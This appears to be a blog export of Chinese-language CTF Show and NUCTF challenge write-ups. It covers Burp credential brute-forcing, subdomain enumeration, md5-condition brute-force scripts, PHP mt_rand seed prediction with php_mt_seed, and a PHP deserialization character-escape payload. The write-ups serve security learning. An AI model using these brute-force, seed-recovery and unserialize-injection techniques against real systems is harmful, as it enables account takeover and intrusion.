<h2 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h2><p><img src="https://i.loli.net/2021/08/14/Rn7LtWDXEldPBp3.png" alt="image-20210814215714938"></p>
<p>50 4B 03 04 ZIP文件</p>
<p><img src="https://i.loli.net/2021/08/14/KY4lPejVoOUiqbt.png" alt="image-20210814215832498"></p>
<p><img src="https://i.loli.net/2021/08/14/LiNXRJ9SHnwVtEz.png" alt="image-20210814220223592"></p>
<p>这是用来迷惑的</p>
<p>存在一个文本文档，是个 图片，浏览器访问</p>
<p><img src="https://i.loli.net/2021/08/16/78L6POtr1spjlBE.png" alt="image-20210816210645822"></p>
<p>扫描得到    cfhwc19abika_etso{h_u_e_ui1}</p>
<p>查看图片属性</p>
<p><img src="https://i.loli.net/2021/08/16/M1JngkVhvbPIDOC.png" alt="image-20210816211218664"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==<span class="comment"># 不知道怎末用</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/FyR5WpEugQI9ShK.png" alt="image-20210816211549442"></p>
<h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><h2 id="命令执行做题思路"><a href="#命令执行做题思路" class="headerlink" title="命令执行做题思路"></a>命令执行做题思路</h2><ol>
<li><p>一眼就有思路的直接掠过</p>
</li>
<li><p>一眼没有思路的，首先根据正则的过滤分类，决定思路</p>
<ul>
<li><p>有回显？无回显？ eval    exec</p>
</li>
<li><p>eval  还是  system</p>
</li>
<li><p>无字母数字类？</p>
<p>异或？或？取反？自增？</p>
</li>
<li><p>过滤 ;</p>
</li>
<li><p>过滤 ‘ ‘    “ “</p>
</li>
<li><p>找 phpinfo() 看被 ban 的函数名</p>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-爆破</title>
    <url>/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<p>CTF show 爆破篇。</p>
<span id="more"></span>

<h1 id="一、CTF-show-—-爆破"><a href="#一、CTF-show-—-爆破" class="headerlink" title="一、CTF show — 爆破"></a>一、CTF show — 爆破</h1><h2 id="1-1-Web-21-—-Burp-爆破-—-base64-encode"><a href="#1-1-Web-21-—-Burp-爆破-—-base64-encode" class="headerlink" title="1.1 Web 21 — Burp 爆破 — base64-encode"></a>1.1 Web 21 — Burp 爆破 — base64-encode</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆破什么的，都是基操</span><br></pre></td></tr></table></figure>

<p><strong>抓包查看</strong>：输入的账号密码都被base64加密了，并且中间还有一个 <code>:</code> 分割</p>
<p>Burp 抓包，下载题目给的字典，进行爆破：手动更改 <code>admin:</code> base64 加密之后的内容，只将密码部分设为变量，加载题目字典，设置 base64-encode 加密，<strong>去掉勾选 URL编码</strong>，开始攻击。</p>
<p><img src="https://i.loli.net/2021/07/14/MTD1Bp7G5F2tAiU.png" alt="image-20210714212830673"></p>
<p><img src="https://i.loli.net/2021/07/14/bxHg23aGJ7BWPe6.png" alt="image-20210714212813152"></p>
<h2 id="1-2-Web-22-—-子域名爆破-—-subDomainBrute-工具"><a href="#1-2-Web-22-—-子域名爆破-—-subDomainBrute-工具" class="headerlink" title="1.2 Web 22 — 子域名爆破 — subDomainBrute 工具"></a>1.2 Web 22 — 子域名爆破 — subDomainBrute 工具</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名也可以爆破的，试试爆破这个ctf.show的子域名</span><br></pre></td></tr></table></figure>

<p><strong>subDomainBrute 工具子域名爆破</strong></p>
<p><img src="https://i.loli.net/2021/07/15/24RTe3VNyP5ujhU.png" alt="image-20210715113857094"></p>
<p>访问 <code>http://flag.ctfer.com/index.php</code></p>
<h2 id="1-3-Web-23-—-根据代码要求写脚本"><a href="#1-3-Web-23-—-根据代码要求写脚本" class="headerlink" title="1.3 Web 23 — 根据代码要求写脚本"></a>1.3 Web 23 — 根据代码要求写脚本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">还爆破？这么多代码，告辞！</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ]) 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 数值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>脚本：如果是 二位数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;36;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=0;<span class="variable">$j</span>&lt;36;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];    </span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$token</span>); </span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, 1,1)===substr(<span class="variable">$token</span>, 14,1) &amp;&amp; substr(<span class="variable">$token</span>, 14,1) ===substr(<span class="variable">$token</span>, 17,1))&#123; </span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, 1,1))+intval(substr(<span class="variable">$token</span>, 14,1))+substr(<span class="variable">$token</span>, 17,1))/substr(<span class="variable">$token</span>, 1,1)===intval(substr(<span class="variable">$token</span>, 31,1)))&#123; </span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="built_in">exit</span>(0);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br><span class="line"><span class="comment"># 得到 3j</span></span><br></pre></td></tr></table></figure>

<p><strong>脚本：如果是 三位数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="built_in">print</span> (strlen(<span class="variable">$string</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = 0; <span class="variable">$a</span> &lt; 62; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$b</span> = 0; <span class="variable">$b</span> &lt; 62; <span class="variable">$b</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$c</span> = 0; <span class="variable">$c</span> &lt; 62; <span class="variable">$c</span>++) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="variable">$string</span>[<span class="variable">$a</span>] . <span class="variable">$string</span>[<span class="variable">$b</span>] . <span class="variable">$string</span>[<span class="variable">$c</span>];</span><br><span class="line">            <span class="variable">$token</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line">            <span class="keyword">if</span>(substr(<span class="variable">$token</span>, 1,1)===substr(<span class="variable">$token</span>, 14,1) &amp;&amp; substr(<span class="variable">$token</span>, 14,1) ===substr(<span class="variable">$token</span>, 17,1))&#123; </span><br><span class="line">            	<span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, 1,1))+intval(substr(<span class="variable">$token</span>, 14,1))+substr(<span class="variable">$token</span>, 17,1))/substr(<span class="variable">$token</span>, 1,1)===intval(substr(<span class="variable">$token</span>, 31,1)))&#123; </span><br><span class="line">                    <span class="built_in">echo</span> <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 得到 62 aDp a6e b7l ejt hc2 jGd ktD o07 pjd ubv vMJ v8O wuB wyG xjF AKh DCj D36 GT7 H3D Jik JKh KtR K2e LfJ Lqj Nzc Oie OiU R7V ScB SSM SVi UYg WwF 1zg 4cQ 422 6xU 6Vh 7vE</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-Web-24-—-php-伪随机数-—-mt-srand"><a href="#1-4-Web-24-—-php-伪随机数-—-mt-srand" class="headerlink" title="1.4 Web 24 — php 伪随机数 — mt_srand()"></a>1.4 Web 24 — php 伪随机数 — mt_srand()</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$r</span>)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="built_in">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpmt_srand(372619038);<span class="built_in">echo</span>(mt_rand());?&gt;<span class="comment"># 得到 1155388967</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>伪随机数漏洞：当种子不变时，实际上生成的随机数是固定的。</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/03/41LYMjzASdVfFUW.png" alt="image-20210803191659621"></p>
<p><img src="https://i.loli.net/2021/08/03/Jh12MBwLlyzgCNH.png" alt="image-20210803191723585"></p>
<h2 id="1-5-Web-25-—-php-伪随机数-逆推种子-—-php-mt-seed-工具使用"><a href="#1-5-Web-25-—-php-伪随机数-逆推种子-—-php-mt-seed-工具使用" class="headerlink" title="1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用"></a>1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用</h2><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
<p>知道种子，可以确定你输出伪随机数的序列</p>
<p>知道随机数序列，倒过来也可以确定你的种子，如何确定？</p>
<p>工具 php_mt_seed</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), 0,8)));    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;            <span class="built_in">echo</span> <span class="variable">$flag</span>;        &#125;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">echo</span> <span class="variable">$rand</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);    <span class="built_in">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexdec() 函数把十六进制转换为十进制。mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), 0,8)));	<span class="comment">#确定 种子$rand = intval($r)-intval(mt_rand());		#得到随机数，与传入的 ?r 有关如果该随机数不存在，则输出 $rand如果该随机数存在，并且 $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) 则输出 $flag**代码分析**</span></span><br></pre></td></tr></table></figure>

<ul>
<li>那么生成的随机数，也就是与传入的 r 有关，而 r 我们可控</li>
<li>通过生成的随机数进行逆推可以得到种子，<a href="https://www.openwall.com/php_mt_seed/">工具 php_mt_seed</a></li>
</ul>
<p>还要注意的是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到 <span class="variable">$flag</span> 的条件：1. !<span class="variable">$rand</span> 即 <span class="variable">$rand</span> 不存在2. <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()) 也就是说，我们得计算出 token 的值，然后发包的时候要进行修改</span><br></pre></td></tr></table></figure>

<p>如何确保 <code>$rand 不存在</code> ？</p>
<p>测试</p>
<p><img src="https://i.loli.net/2021/08/04/AwBydsMHNcEvTaf.png" alt="image-20210804104524845"></p>
<p>当我们设置了种子之后 <code>mt_srand</code> ，我们只要传 同样的 r ，那么最终得到的 $rand 都是一样的，那么反过来，如果 我们传入 <code>?r=522258682</code> ，那最终就可以得到 $rand = 0</p>
<p><img src="https://i.loli.net/2021/08/04/cxFHsZhzS9WkE7i.png" alt="image-20210804104657248"></p>
<p>那现在我们就得要计算 <code>(mt_rand()+mt_rand())</code> 了</p>
<p>要计算生成的随机数之和，首先得先确定种子才行啊</p>
<p>使用工具 php_mt_seed</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/otukijoe/php_mt_seed.git</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/s7z4fFxmrRypnAv.png" alt="image-20210804105157149"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maketime ./php_mt_seed 1446899118</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/oGrb6JHqlOXT7VW.png" alt="image-20210804105726200"></p>
<p>通过抓包可以知道 该 php 版本是 PHP/7.3.11</p>
<p>计算 token 值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);mt_srand(<span class="number">1048340704</span>);<span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="keyword">echo</span> mt_rand()+mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="comment">//1446899118 219330488<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>抓包改值</p>
<p><img src="https://i.loli.net/2021/08/04/W1RHU2xBnvaPcCy.png" alt="image-20210804110911859"></p>
<h2 id="1-6-Web-26"><a href="#1-6-Web-26" class="headerlink" title="1.6 Web 26"></a>1.6 Web 26</h2><p><img src="https://i.loli.net/2021/08/04/EMhK6QNp3OcSnyA.png" alt="image-20210804111036383"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p> 查看源码</p>
<p><img src="https://i.loli.net/2021/08/04/jWUtw3qxuB1pd2s.png" alt="image-20210804111200056"></p>
<p><img src="https://i.loli.net/2021/08/04/x18GrqLFoT5PRV7.png" alt="image-20210804111426026"></p>
<h2 id="1-7-Web-27-—-身份证爆破"><a href="#1-7-Web-27-—-身份证爆破" class="headerlink" title="1.7 Web 27 — 身份证爆破"></a>1.7 Web 27 — 身份证爆破</h2><p><img src="https://i.loli.net/2021/08/04/o42RDNuHFIJBS8Y.png" alt="image-20210804112204280"></p>
<p> <img src="https://i.loli.net/2021/08/04/piUhumyn5bV4aEq.png" alt="image-20210804111755165"></p>
<p><img src="https://i.loli.net/2021/08/04/TVUe3r1Y2vjW5ER.png" alt="image-20210804111806858"></p>
<p>我们需要爆破出 学生的出生日期</p>
<p>Burp</p>
<p>上面可以看到该平台是 1999-2017 年的，那么作为大学生此时应该十八九岁，所以他们应该是1980 年之后的基本上</p>
<p>那么我们就从 1980 年开始设置 date 字典</p>
<p><img src="https://i.loli.net/2021/08/04/c15B8xbASmQryaW.png" alt="image-20210804113135627"></p>
<p>然后成功查询，得到  <strong>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">621022199002015237  02015237</span><br></pre></td></tr></table></figure>

<p>最后成功登录即可</p>
<h2 id="1-8-Web-28"><a href="#1-8-Web-28" class="headerlink" title="1.8 Web 28"></a>1.8 Web 28</h2><p><img src="https://i.loli.net/2021/08/04/lCz96ZbM1hA7tKR.png" alt="image-20210804114109990"></p>
<p>Url 当中的 <code>/0/1/</code> 尝试爆破，即可得到</p>
]]></content>
      <categories>
        <category>CTF-Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NUCTF</title>
    <url>/2021/06/24/NUCTF/</url>
    <content><![CDATA[<p>概述：主要考点 — 序列化与反序列化字符逃逸</p>
<span id="more"></span>

<h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="1-EasyUnser"><a href="#1-EasyUnser" class="headerlink" title="1 EasyUnser"></a>1 EasyUnser</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">// Security filtering function	</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">       <span class="comment">// Security filtering</span></span><br><span class="line">       <span class="variable">$h</span>-&gt;username = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">       <span class="variable">$c</span> = unserialize(filter(serialize(<span class="variable">$h</span>)));</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$c</span>-&gt;password === <span class="string">&#x27;hacker&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>POST 传入参数 username 和 password</li>
<li>题目初始化 <code>public $password = &#39;margin123&#39;;</code> ，而要想获取 flag 必须使 password 为 hacker</li>
<li>根据 PHP 反序列化时遇到 <code>;&#125;</code> 即反序列化结束，我们传入 username 为 <code>margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code> ，希望原本初始化的 password 的值 <code>margin123</code> 失效（被顶出去）</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   print_r(unserialize(<span class="variable">$h</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="4">
<li>如果我们将上面的得到的内容进行 <code>反序列化输出</code>，结果将会报错；这是因为 <code>s:37:&quot;margin&quot;;</code> 这里按道理应该是 <code>s:6:&quot;margin&quot;;</code>，但由于我们需要按照上面的方法将后面的 <code>&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</code> 挤掉，因此实际上传入的长度是37，所以我们需要想办法将这37个长度补齐，还需要多传入 31个长度；</li>
<li>题目中的 filter 函数即是将 <code>secuer 替换为 secured</code> ，一个 secured 比 secure 多一个长度，那么 31个 secure 就会多出 31个长度，从而导致字符增加</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">实际上username的长度是<span class="number">186</span>，但是被替换之后成为</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被 filter 替换之后变成 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样就补齐了</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post传参：   username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22</span>password%<span class="number">22</span>;s:<span class="number">6</span>:%<span class="number">22</span>hacker%<span class="number">22</span>;&#125;&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<h2 id="2-Just-Serizlize"><a href="#2-Just-Serizlize" class="headerlink" title="2 Just Serizlize"></a>2 Just Serizlize</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="comment">// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$obj</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = @unserialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;flag === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>GET 传参 obj；</li>
<li>传入参数不得含有 flag；对象中包含 flag 字段时，才会传入 $flag 的内容；但当字段名不为 flag 时，才能显示出 $flag；</li>
<li>hex 编码绕过 <code>if ($k !== &quot;flag&quot;) </code> ，把 s 换成 S；</li>
<li>表示字符类型的s大写时, 会被当成16进制解析, 定义一个变量取 flag 变量的地址即可得到 flag 变量的值；</li>
</ol>
</blockquote>
